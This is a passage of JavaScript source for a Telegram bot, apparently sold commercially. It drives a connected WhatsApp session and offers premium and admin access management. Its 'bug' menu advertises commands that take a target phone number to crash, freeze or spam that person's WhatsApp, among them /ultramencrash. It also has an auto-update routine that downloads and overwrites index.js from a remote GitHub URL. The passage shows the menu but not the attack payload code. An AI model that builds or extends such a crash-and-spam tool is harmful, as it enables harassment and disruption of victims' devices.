    console.log("❌ Error start session:", err);
    isStarting = false;
  }
};
///////////////////////////////////////////////////
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    return ctx.reply("❌ WhatsApp belum connect, /connect dulu");
  }
  return next();
};

//////////////////////////////////////
const loadJSON = (file) => {
  try {
    if (!fs.existsSync(file)) return [];

    const data = fs.readFileSync(file, "utf8");
    if (!data) return [];

    return JSON.parse(data);
  } catch (err) {
    console.log("⚠️ JSON corrupt:", file);
    return [];
  }
};
//////////////////////////////////////
const saveJSON = (file, data) => {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (err) {
    console.log("❌ Failed save JSON:", file, err.message);
  }
};

//////////////////////////////////////
function deleteSession() {
  try {
    if (!sessionPath || !fs.existsSync(sessionPath)) {
      console.log("⚠️ Session not found.");
      return false;
    }

    fs.rmSync(sessionPath, { recursive: true, force: true });
    console.log("🗑️ Session deleted successfully.");
    return true;

  } catch (err) {
    console.log("❌ Failed delete session:", err.message);
    return false;
  }
}
//////////////////////////////////////
module.exports = {
  startSesi,
  checkWhatsAppConnection,
  loadJSON,
  saveJSON,
  deleteSession,
};
//// Variabel ///
let antiCulik = true;
let autoReject = false; 
let pendingGroups = new Map();
let whitelistGroups = []; 
//////////////////////////////////////
let ownerUsers = loadOwner();
let premiumUsers = loadJSON(premiumFile);
let adminList    = [];

loadAdmins();

//////////////////////////////////////

/// ---- OWNER ---- ///
const checkOwner = (ctx, next) => {
  const id = ctx.from.id.toString();

  if (!ownerUsers.includes(id)) {
    return ctx.reply("Owner Access\nContact @Bawzhhh");
  }

  return next();
};
/// ---- ADMIN ---- ///
const checkAdmin = (ctx, next) => {
  const id = ctx.from.id.toString();

  if (
    !adminList.includes(id) &&
    !ownerUsers.includes(id)
  ) {
    return ctx.reply("Admin Access\nContact @Bawzhhh");
  }

  return next();
};
/// ---- PREMIUM ---- ///
const checkAllPremium = (ctx, next) => {
  const id = ctx.from.id.toString();

  
  if (premiumUsers.includes(id)) {
    return next();
  }

 
  if (ctx.chat.type !== "private" && isGroupPremium(ctx.chat.id)) {
    return next();
  }

  return ctx.reply("❌ Premium Access\nContact @Bawzhhh");
};
/// Anti culik ///
function isSafeGroup(groupId) {
  return whitelistGroups.includes(groupId.toString());
}

function loadSafe() {
  try {
    if (!fs.existsSync(safeFile)) return [];
    return JSON.parse(fs.readFileSync(safeFile, "utf8") || "[]");
  } catch {
    return [];
  }
}

function saveSafe(data) {
  fs.writeFileSync(safeFile, JSON.stringify(data, null, 2));
}

//// Group prem ////
function loadPremiumGroups() {
  try {
    if (!fs.existsSync(premiumGroupsFile)) return [];
    return JSON.parse(fs.readFileSync(premiumGroupsFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
//////////
function savePremiumGroups(data) {
  fs.writeFileSync(premiumGroupsFile, JSON.stringify(data, null, 2));
}
//////////
function isGroupPremium(groupId) {
  return loadPremiumGroups().includes(groupId.toString());
}
/// ---- ADD ADMIN ---- ///
function addAdmin(userId) {
  userId = userId.toString();

  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
}

/// ---- REMOVE ADMIN ---- ///
function removeAdmin(userId) {
  userId = userId.toString();

  adminList = adminList.filter(id => id !== userId);
  saveAdmins();
}

/// ---- SAVE ADMIN ---- ///
function saveAdmins() {
  try {
    fs.writeFileSync("./database/admins.json", JSON.stringify(adminList, null, 2));
  } catch (err) {
    console.log("❌ Gagal save admin:", err.message);
  }
}

/// ---- LOAD ADMIN ---- ///
function loadAdmins() {
  try {
    if (!fs.existsSync("./database/admins.json")) {
      adminList = [];
      return;
    }

    const data = fs.readFileSync("./database/admins.json", "utf8");

   
    adminList = JSON.parse(data || "[]").map(id => id.toString());

  } catch (err) {
    console.log("⚠️ Gagal load admin:", err.message);
    adminList = [];
  }
}
/// ---- SLEEP ---- ///
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/// ---- CHECK PREMIUM ---- ///
function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}

/// ---- CHECK OWNER ---- ///
function isOwner(id) {
  return ownerUsers.includes(id.toString());
}

/// ---- LOAD OWNER ---- ///
function loadOwner() {
  try {
    if (!fs.existsSync(ownerFile)) return [];
    return JSON.parse(fs.readFileSync(ownerFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
/// ------ Check Sender ------- \\\
function isSender(userId) {
  return senderUsers.includes(String(userId));
}
// ================= ANTI FOTO =============== //
function loadAntiFoto() {
  try {
    if (!fs.existsSync(antiFotoFile)) return []
    return JSON.parse(fs.readFileSync(antiFotoFile))
  } catch {
    return []
  }
}


function saveAntiFoto(data) {
  fs.writeFileSync(antiFotoFile, JSON.stringify(data, null, 2))
}

let antiFotoGroups = loadAntiFoto()

/// ------- ANTI VIDIO ------- ///
function loadAntiVideo() {
  try {
    if (!fs.existsSync(antiVideoFile)) return []
    return JSON.parse(fs.readFileSync(antiVideoFile))
  } catch {
    return []
  }
}

function saveAntiVideo(data) {
  fs.writeFileSync(antiVideoFile, JSON.stringify(data, null, 2))
}

let antiVideoGroups = loadAntiVideo()
/// ---- GROUP ONLY ---- ///
bot.use((ctx, next) => {
  const groupMode = getGroupMode();

  if (groupMode === "on" && ctx.chat.type === "private") {
    return ctx.reply(`
🔒 𝐆𝐑𝐎𝐔𝐏 𝐎𝐍𝐋𝐘 𝐌𝐎𝐃𝐄

Bot ini hanya bisa digunakan di dalam group.
Silakan gunakan perintah di group.
`);
  }

  return next();
});
/// ---- SELF / PUBLIC MODE ---- ///
bot.use((ctx, next) => {
  const mode = getMode();

  if (mode === "self" && !isOwner(ctx.from.id)) {

    if (ctx.callbackQuery) {
      return ctx.answerCbQuery("🔒 BOT DI KUNCI OWNER", { show_alert: true });
    }

    return; 
  }

  return next();
});
/// -------- ( menu utama ) --------- \\\
function mainKeyboard() {
  return [
    [
      { text: "⚙️𝐗𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒", callback_data: "xsettings", style: "success" },
      { text: "💎𝐓𝐎𝐎𝐋𝐒", callback_data: "tools", style: "success" }
    ],
    [
      { text: "🚀𝐗𝐌𝐄𝐍𝐔𝐁𝐔𝐆𝐒", callback_data: "xbugs", style: "danger" }
    ],
    [
      { text: "🎖️𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎", callback_data: "thanks", style: "success" },
      { text: "🌿𝐂𝐇𝐀𝐍𝐄𝐋", url: "https://t.me/AboutMybawz", style: "success" },
    ],
    [
      { text: "👑𝐃𝐄𝐕", url: "https://t.me/Bawzhhh", style: "danger" }
    ]
  ];
}

async function editMenu(ctx, caption, keyboard) {
  try {
    await ctx.editMessageMedia(
      {
        type: "photo",
        media: { source: "./image/Gxion.jpg" },
        caption: caption,
        parse_mode: "HTML"
      },
      {
        reply_markup: { inline_keyboard: keyboard }
      }
    );
  } catch (e) {
    await ctx.replyWithPhoto(
      { source: "./image/Gxion.jpg" },
      {
        caption,
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: keyboard }
      }
    );
  }
}

async function sendHome(ctx) {
  const premium = isPremium(ctx.from.id);
  const sender = isWhatsAppConnected;

  const caption = `
<blockquote>☾. ⬡═―⊱「 𝔾   𝕏   𝕀   𝕆   ℕ 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
<blockquote>☾. ⬡═―⊱「 📩 INFORMATION 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
◇ Developer : @Bawzhhh
◇ Version   : 1.0 New Era
◇ System    : Auto-Update
◇ Language  : JavaScript
◇ Framework : Telegraf
<blockquote>☾. ⬡═―⊱「 🪧 STATUS 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
◇ Premium : ${premium ? "Yes" : "No"}
◇ Sender  : ${sender ? "Yes" : "No"}
◇ Runtime : ${runtime(process.uptime())}
◇ Memory  : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
<blockquote>ֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
`;

  await editMenu(ctx, caption, mainKeyboard(), {
    parse_mode: "HTML"
  });
} // ✅ WAJIB DITUTUP

// =========================

bot.start(async (ctx) => {
  await sendHome(ctx);
});

// =========================

bot.action("xsettings", async (ctx) => {
  await ctx.answerCbQuery();

  const caption = `
<blockquote>☾. ⬡═―⊱「 𝔾   𝕏   𝕀   𝕆   ℕ 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
<blockquote>☾. ⬡═―⊱「 📩 INFORMATION 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
◇ Developer : @Bawzhhh
◇ Version   : 1.0 New Era
◇ System    : Auto-Update
◇ Language  : JavaScript
◇ Framework : Telegraf
<blockquote>☾. ⬡═―⊱「 ⚙️ XSETTINGS MENU 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
◇ /update
◇ /connect
◇ /addprem
◇ /delprem
◇ /addadmin
◇ /deladmin
◇ /addgrouppremium
◇ /delgrouppremium
◇ /anticulik
◇ /addsafe
◇ /delsafe
◇ /self
◇ /public
◇ /groupon
◇ /groupoff
◇ /antifoto
◇ /antivideo
◇ /runtime
◇ /mode
◇ /cekowner
<blockquote>ִֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
`;

  await editMenu(
    ctx,
    caption,
    [[{ text: "🔙 BACK MENU", callback_data: "backmenu", style: "primary" }]],
    { parse_mode: "HTML" }
  );
});
// =========================
// PINDAHIN FUNCTION KE LUAR
async function showthanks(ctx, page = 3) {
  let caption = "";
  let keyboard = [];

  if (page === 3) {
    caption = `
<blockquote>☾. ⬡═―⊱「 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
⩥ @Bawzhhh  
<blockquote>☾. ⬡═―⊱「 𝐅𝐫𝐢𝐞𝐧𝐝 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
⩥ @SonKairn    
⩥ @Rifki_ofxz     
⩥ @imherekobars   
⩥ @Apexmbud     
⩥ @Sniitzz     
⩥ @ikyyymwNgewe    
⩥ @bahlilmeme
⩥ @ZuxxzyOffc1
⩥ @PetxzVps
<blockquote>☾. ⬡═―⊱「 𝐁𝐞𝐬𝐭 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
⩥ @Allah
⩥ @Ortu
⩥ @Xatanicvxii
⩥ @xwarrxxx
⩥ @ungkeeeeee
⩥ @Xerozzz_Reals      
⩥ @FebbStecu      
<blockquote>ִֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
`;

    keyboard = [
      [
        { text: "➡️", callback_data: "info_4", style: "success" }
      ],
      [
        { text: "🔙 BACK MENU", callback_data: "backmenu", style: "primary" }
      ]
    ];
  }

  if (page === 4) {
    caption = `
<blockquote>☾. ⬡═―⊱「 MESSAGE FROM DEVELOPER 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
<blockquote>Halo gays perkenalkan nih gua nama gua bawzhhh nah gua ingin mengucapkan sebuah kata terimakasih kepada kalian-kalian karena telah menggunakan script ini dan telah membeli script ini tanpa sukarela, Disini gua juga ingin berterimakasih kepada teman teman yang sudah membantu gua membangkitkan script ini lagi, Dan gua ingin mengucapkan juga sebuah perkataan maaf dikarenakan script ini tidak sebagus yang seperti sebelumnya, dikarenakan berbeda base, Saya ingin meminta maaf jika dari segi tools & bug cmd nya dikit , Tetapi saya akan berusaha membangun script ini menjadi yang lebih baik lagi dari sebelum-sebelumnya, Terimakasih saya akan berjuang dengan giat.

Dengan ini saya ucapkan Terimakasih Dan salam Hormat

Tq All Buyer And Tq All My Friend And Best Support
</blockquote>

<blockquote>ִֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
`;

    keyboard = [
      [
        { text: "⬅️", callback_data: "info_3", style: "success" }
      ],
      [
        { text: "🔙 BACK MENU", callback_data: "backmenu", style: "primary" }
      ]
    ];
  }

  await editMenu(ctx, caption, keyboard, {
    parse_mode: "HTML"
  });
}

// =========================


// ACTION AWAL
bot.action("thanks", async (ctx) => {
  await ctx.answerCbQuery();
  await showthanks(ctx, 3);
});

// NAVIGASI
bot.action("info_3", async (ctx) => {
  await ctx.answerCbQuery();
  await showthanks(ctx, 3);
});

bot.action("info_4", async (ctx) => {
  await ctx.answerCbQuery();
  await showthanks(ctx, 4);
});

bot.action("backmenu", async (ctx) => {
  await ctx.answerCbQuery();
  await sendHome(ctx);
});

// =========================

bot.action("xbugs", async (ctx) => {
  await ctx.answerCbQuery();
  await showxbugs(ctx, 1);
});

async function showxbugs(ctx, page = 1) {
  let caption = "";
  let keyboard = [];

  if (page === 1) {
    caption = `
<blockquote>☾. ⬡═―⊱「 𝔾   𝕏   𝕀   𝕆   ℕ 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
<blockquote>☾. ⬡═―⊱「 📩 INFORMATION 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
◇ Developer : @Bawzhhh
◇ Version   : 1.0 New Era
◇ System    : Auto-Update
◇ Language  : JavaScript
◇ Framework : Telegraf
<blockquote>☾. ⬡═―⊱「 🚀 SPAM BUG MENU 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
◇ /specterdelay   62xxx  → Delay No Kenon
◇ /delayworek     62xxx  → Hard Delay (Maybe)
◇ /EquarTerdelay  62xxx  → One Shot Delay
◇ /dangerdelay    62xxx  → Invisible Delay 100%
◇ /qiSys          62xxx  → Hard Spam No Kenon
◇ /lowsdelay    62xxx  → Currently Delay Invisible
◇ /Xange     62xxx  → Delay Can Spam For Murbug
<blockquote>ִֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
`;

    keyboard = [
      [
        { text: "➡️", callback_data: "info_2", style: "success" }
      ],
      [
        { text: "🔙 BACK MENU", callback_data: "backmenu", style: "primary" }
      ]
    ];
  }

  if (page === 2) {
    caption = `
<blockquote>☾. ⬡═―⊱「 𝔾   𝕏   𝕀   𝕆   ℕ 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
<blockquote>☾. ⬡═―⊱「 📩 INFORMATION 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
◇ Developer : @Bawzhhh
◇ Version   : 1.0 New Era
◇ System    : Auto-Update
◇ Language  : JavaScript
◇ Framework : Telegraf
<blockquote>☾. ⬡═―⊱「 ✨ NO SPAM MENU BUG 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
◇ /ultramencrash   62xxxx  → Blank WhatsApp One Msg
<blockquote>ִֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
`;

    keyboard = [
      [
        { text: "⬅️", callback_data: "info_1", style: "success" }
      ],
      [
        { text: "🔙 BACK MENU", callback_data: "backmenu", style: "primary" }
      ]
    ];
  }

  await editMenu(ctx, caption, keyboard, {
    parse_mode: "HTML"
  });
}

// =========================

bot.action("info_1", async (ctx) => {
  await ctx.answerCbQuery();
  await showxbugs(ctx, 1);
});

bot.action("info_2", async (ctx) => {
  await ctx.answerCbQuery();
  await showxbugs(ctx, 2);
});

bot.action("backmenu", async (ctx) => {
  await ctx.answerCbQuery();
  await sendHome(ctx);
});

// =========================

bot.action("tools", async (ctx) => {
  await ctx.answerCbQuery();

  const caption = `
<blockquote>☾. ⬡═―⊱「 𝔾   𝕏   𝕀   𝕆   ℕ 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
<blockquote>☾. ⬡═―⊱「 📩 INFORMATION 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
◇ Developer : @Bawzhhh
◇ Version   : 1.0 New Era
◇ System    : Auto-Update
◇ Language  : JavaScript
◇ Framework : Telegraf
<blockquote>☾. ⬡═―⊱「 ⚙️ TOOLS 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
◇ /brat
◇ /tiktokdl
◇ /convert
◇ /waktu
◇ /ssiphone
◇ /cekidch
<blockquote>ִֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
`;

  await editMenu(
    ctx,
    caption,
    [[{ text: "🔙 BACK MENU", callback_data: "backmenu", style: "primary" }]],
    { parse_mode: "HTML" }
  );
});
/// ------ ( Plugins ) ------- \\\
function getUserId(ctx) {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return null;

  return args[1].replace(/[^0-9]/g, ""); 
}

bot.action("run_update", async (ctx) => {
  try {
    await ctx.answerCbQuery();
    await doUpdate(ctx);
  } catch (err) {
    console.log("UPDATE BUTTON ERROR:", err.message);
    try {
      await ctx.answerCbQuery("Gagal menjalankan update");
    } catch {}
  }
});

//------------------(AUTO - UPDATE SYSTEM)--------------------//
bot.command("update", async (ctx) => doUpdate(ctx));

const UPDATE_URL =
  "https://raw.githubusercontent.com/Unbandfoul/mataneasu/refs/heads/main/index.js";

const thumbnailUp = "https://files.catbox.moe/ub0wh5.jpg";

const UPDATE_FILE_PATH = "./index.js";

function downloadToFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);

    https
      .get(url, (res) => {
        if (res.statusCode !== 200) {
          file.close(() => fs.unlink(filePath, () => {}));
          return reject(new Error(`HTTP_${res.statusCode}`));
        }

        res.pipe(file);

        file.on("finish", () => file.close(resolve));
      })
      .on("error", (err) => {
        file.close(() => fs.unlink(filePath, () => {}));
        reject(err);
      });
  });
}

async function doUpdate(ctx) {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Khusus owner!");
  }

  await ctx.reply("⏳ <b>Auto Update Script...</b>\nMohon tunggu...", {
    parse_mode: "HTML",
  });

  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    await ctx.reply(
      "✅ <b>Update berhasil!</b>\n📄 Ditemukan: <b>index.js</b>\n♻️ <b>Restarting bot...</b>",
      {
        parse_mode: "HTML",
      }
    );

    setTimeout(() => process.exit(0), 1500);
  } catch (e) {
    await ctx.reply(
      `❌ <b>Gagal update.</b>\nReason: <code>${String(e.message || e)}</code>`,
      { parse_mode: "HTML" }
    );
  }
}

/// CASE BUAT OWNER MENU ///
bot.command("addgroupremium", checkOwner, async (ctx) => {
  try {
   
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    const groupId = ctx.chat.id.toString();
    let premiumGroups = loadPremiumGroups();

    
    if (premiumGroups.includes(groupId)) {
      return ctx.reply("⚠️ Group ini sudah PREMIUM");
    }

  
    premiumGroups.push(groupId);

    savePremiumGroups(premiumGroups);

    return ctx.reply("✅ Group berhasil dijadikan PREMIUM");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("delgrouppremium", checkOwner, async (ctx) => {
  try {
    
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    const groupId = ctx.chat.id.toString();
    let premiumGroups = loadPremiumGroups();

    
    if (!premiumGroups.includes(groupId)) {
      return ctx.reply("⚠️ Group ini bukan premium");
    }

    
    premiumGroups = premiumGroups.filter(id => id !== groupId);

    savePremiumGroups(premiumGroups);

    return ctx.reply("✅ Group berhasil dihapus dari PREMIUM");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("cekowner", (ctx) => {
  const data = loadJSON(ownerFile);
  ctx.reply(`ID kamu: ${ctx.from.id}\nOwner list: ${data.join(", ")}`);
});


bot.command("addadmin", checkOwner, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /addadmin 123");

  if (adminList.includes(userId)) {
    return ctx.reply(`✅ User ${userId} sudah admin.`);
  }

  addAdmin(userId);
  ctx.reply(`✅ Berhasil menambahkan ${userId} menjadi akses admin`);
});


bot.command("addprem", checkAdmin, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /addprem 123");

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ User ${userId} sudah menjadi akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  ctx.reply(`✅ Berhasil menambahkan ${userId} menjadi akses premium`);
});


bot.command("deladmin", checkOwner, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /deladmin 123");

  if (!adminList.includes(userId)) {
    return ctx.reply(`❌ User ${userId} tidak ada di admin.`);
  }

  removeAdmin(userId);
  ctx.reply(`🚫 Berhasil hapus ${userId} dari admin`);
});


bot.command("delprem", checkAdmin, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /delprem 123");

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ User ${userId} tidak ada di premium.`);
  }

  premiumUsers = premiumUsers.filter(id => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  ctx.reply(`🚫 Berhasil hapus ${userId} dari premium`);
});

bot.command("antivideo", async (ctx) => {
  try {
   
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Hanya bisa di group");
    }

    const chatId = ctx.chat.id.toString();

    
    const member = await ctx.getChatMember(ctx.from.id);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa pakai command ini");
    }

    const args = ctx.message.text.split(" ")[1];
    if (!args) {
      return ctx.reply("📌 Format: /antivideo on /off");
    }

  
    if (args === "on") {
      if (!antiVideoGroups.includes(chatId)) {
        antiVideoGroups.push(chatId);
        saveAntiVideo(antiVideoGroups);
      }
      return ctx.reply("✅ Anti video aktif di grup ini");
    }

   
    if (args === "off") {
      antiVideoGroups = antiVideoGroups.filter(id => id !== chatId);
      saveAntiVideo(antiVideoGroups);
      return ctx.reply("❌ Anti video dimatikan");
    }

    return ctx.reply("📌 Gunakan: /antivideo on /off");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.on("video", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiVideoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim video di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})


bot.command("antifoto", async (ctx) => {
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Hanya bisa di group")
  }

  
  const member = await ctx.getChatMember(ctx.from.id)
  if (!["administrator", "creator"].includes(member.status)) {
    return ctx.reply("❌ Hanya admin yang bisa pakai command ini")
  }

  const args = ctx.message.text.split(" ")[1]
  if (!args) return ctx.reply("📌 Format: /antifoto on /off")

  const chatId = ctx.chat.id.toString()

  if (args === "on") {
    if (!antiFotoGroups.includes(chatId)) {
      antiFotoGroups.push(chatId)
      saveAntiFoto(antiFotoGroups)
    }
    return ctx.reply("✅ Anti foto aktif di grup ini")
  }

  if (args === "off") {
    antiFotoGroups = antiFotoGroups.filter(id => id !== chatId)
    saveAntiFoto(antiFotoGroups)
    return ctx.reply("❌ Anti foto dimatikan")
  }

  ctx.reply("📌 Gunakan: /antifoto on /off")
})

bot.on("photo", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiFotoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim foto di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})

bot.command("groupon", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("on");
  ctx.reply("👥 Group Only berhasil diaktifkan.");
});

bot.command("groupoff", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("off");
  ctx.reply("🌍 Group Only dimatikan.");
});

bot.command("mode", (ctx) => {
  ctx.reply(`⚙️ Mode saat ini: ${getMode().toUpperCase()}`);
});

bot.command("self", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("self");
  ctx.reply("🔒 Bot Di kunci Owner.");
});

bot.command("public", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("public");
  ctx.reply("🔓 Bot di buka oleh Owner.");
});

bot.command("runtime", (ctx) => {
  const uptime = process.uptime();
  const h = Math.floor(uptime / 3600);
  const m = Math.floor((uptime % 3600) / 60);
  const s = Math.floor(uptime % 60);

  ctx.reply(
`┏━━━〔 RUNTIME 〕━━━┓
┃ 🤖 Bot Active
┃ ⏳ ${h} Jam ${m} Menit ${s} Detik
┗━━━━━━━━━━━━━━━━━━┛`
  );
});


bot.command("anticulik", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner!");

  const args = ctx.message.text.split(" ")[1];

  if (!args) {
    return ctx.reply("Gunakan:\n/anticulik on\n/anticulik off\n/anticulik autoreject");
  }

  if (args === "on") {
    antiCulik = true;
    autoReject = false;
    ctx.reply("✅ AntiCulik ON");
  } else if (args === "off") {
    antiCulik = false;
    ctx.reply("❌ AntiCulik OFF");
  } else if (args === "autoreject") {
    antiCulik = true;
    autoReject = true;
    ctx.reply("🚫 Auto Reject ON");
  }
});


bot.command("addsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Gunakan di group");
  }

  const id = ctx.chat.id.toString();

  if (whitelistGroups.includes(id)) {
    return ctx.reply("⚠️ Sudah SAFE");
  }

  whitelistGroups.push(id);
  saveSafe(whitelistGroups);

  ctx.reply("✅ Group SAFE");
});

bot.command("delsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  const id = ctx.chat.id.toString();

  whitelistGroups = whitelistGroups.filter(v => v !== id);
  saveSafe(whitelistGroups);

  ctx.reply("❌ SAFE dihapus");
});

bot.on("my_chat_member", async (ctx) => {
  try {
    const status = ctx.update.my_chat_member.new_chat_member.status;

    if (status !== "member" && status !== "administrator") return;
    if (!antiCulik) return;

    const chat = ctx.chat;
    const groupId = chat.id;
    const groupName = chat.title;

  
    if (isSafeGroup(groupId)) return;

    const from = ctx.update.my_chat_member.from;

    const userId = from.id;
    const username = from.username ? "@" + from.username : "Tidak ada";
    const fullName = `${from.first_name || ""} ${from.last_name || ""}`.trim();

   
    if (autoReject) {
      try {
        await ctx.telegram.sendMessage(groupId, "🚫 Auto keluar (AntiCulik)");
        await ctx.telegram.banChatMember(groupId, userId).catch(()=>{});
        await ctx.telegram.leaveChat(groupId);
      } catch {}
      return;
    }

   
    pendingGroups.set(groupId, {
      userId,
      username,
      fullName,
      groupName
    });

    
    for (let ownerId of loadOwner()) {
      try {
        await bot.telegram.sendMessage(
          ownerId,
`🚨 BOT DICULIK

📛 Grup : ${groupName}
🆔 ID   : ${groupId}

👤 Pelaku:
• Nama     : ${fullName}
• Username : ${username}
• ID       : ${userId}`,
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "✅ Izinkan", callback_data: `allow_${groupId}` },
                  { text: "❌ Tolak", callback_data: `deny_${groupId}` }
                ]
              ]
            }
          }
        );
      } catch {}
    }

  } catch (err) {
    console.log("AntiCulik error:", err);
  }
});

bot.action(/(allow|deny)_(.+)/, async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Bukan owner!", { show_alert: true });
  }

  const action = ctx.match[1];
  const groupId = Number(ctx.match[2]);

  const data = pendingGroups.get(groupId);

  try { await ctx.deleteMessage(); } catch {}

  if (action === "allow") {
    pendingGroups.delete(groupId);

    await ctx.reply("✅ Bot diizinkan");

    try {
      await ctx.telegram.sendMessage(groupId, "✅ Bot diizinkan oleh owner");
    } catch {}
  }

  if (action === "deny") {
    pendingGroups.delete(groupId);

    await ctx.reply("❌ Bot ditolak");

    try {
      await ctx.telegram.sendMessage(groupId, "❌ Bot ditolak oleh owner");

      if (data?.userId) {
        await ctx.telegram.banChatMember(groupId, data.userId).catch(()=>{});
      }

      await ctx.telegram.leaveChat(groupId);
    } catch {}
  }
});
//// Tools ///
bot.command("ssiphone", async (ctx) => {
